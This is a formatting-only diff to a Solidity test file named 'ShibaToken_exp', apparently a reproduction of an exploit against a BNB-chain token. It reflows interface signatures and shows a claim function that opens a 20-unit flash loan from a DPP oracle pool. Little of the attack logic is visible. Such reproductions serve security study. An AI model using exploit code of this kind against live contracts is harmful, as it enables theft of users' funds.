@@ -16,16 +16,22 @@ interface IDPPOracle {
 interface IERC20 {
     function approve(address spender, uint256 amount) external returns (bool);
     function transfer(address to, uint256 value) external returns (bool);
-    function balanceOf(address) external view returns (uint256);
+    function balanceOf(
+        address
+    ) external view returns (uint256);
 }
 
 interface IWBNB is IERC20 {
     function deposit() external payable;
-    function withdraw(uint256) external;
+    function withdraw(
+        uint256
+    ) external;
 }
 
 interface ICO {
-    function buyByBnb(address token) external payable;
+    function buyByBnb(
+        address token
+    ) external payable;
 }
 
 interface ISHIBA is IERC20 {
@@ -34,7 +40,9 @@ interface ISHIBA is IERC20 {
         uint256 amount;
     }
 
-    function batchTransferLockToken(Airdrop[] memory _airdrops) external;
+    function batchTransferLockToken(
+        Airdrop[] memory _airdrops
+    ) external;
 }
 
 interface IPancakePair {
@@ -45,7 +53,9 @@ interface IPancakePair {
     function symbol() external pure returns (string memory);
     function decimals() external pure returns (uint8);
     function totalSupply() external view returns (uint256);
-    function balanceOf(address owner) external view returns (uint256);
+    function balanceOf(
+        address owner
+    ) external view returns (uint256);
     function allowance(address owner, address spender) external view returns (uint256);
 
     function approve(address spender, uint256 value) external returns (bool);
@@ -54,7 +64,9 @@ interface IPancakePair {
 
     function DOMAIN_SEPARATOR() external view returns (bytes32);
     function PERMIT_TYPEHASH() external pure returns (bytes32);
-    function nonces(address owner) external view returns (uint256);
+    function nonces(
+        address owner
+    ) external view returns (uint256);
 
     function permit(
         address owner,
@@ -87,10 +99,16 @@ interface IPancakePair {
     function price1CumulativeLast() external view returns (uint256);
     function kLast() external view returns (uint256);
 
-    function mint(address to) external returns (uint256 liquidity);
-    function burn(address to) external returns (uint256 amount0, uint256 amount1);
+    function mint(
+        address to
+    ) external returns (uint256 liquidity);
+    function burn(
+        address to
+    ) external returns (uint256 amount0, uint256 amount1);
     function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
-    function skim(address to) external;
+    function skim(
+        address to
+    ) external;
     function sync() external;
 
     function initialize(address, address) external;
@@ -133,7 +151,9 @@ contract ShibaToken_exp is Test {
         claim(20);
     }
 
-    function claim(uint256) public {
+    function claim(
+        uint256
+    ) public {
         xfeaf.flashLoan(20_000_000_000_000_000_000, 0, r, hex"00");
         x55d3.balanceOf(r);
     }
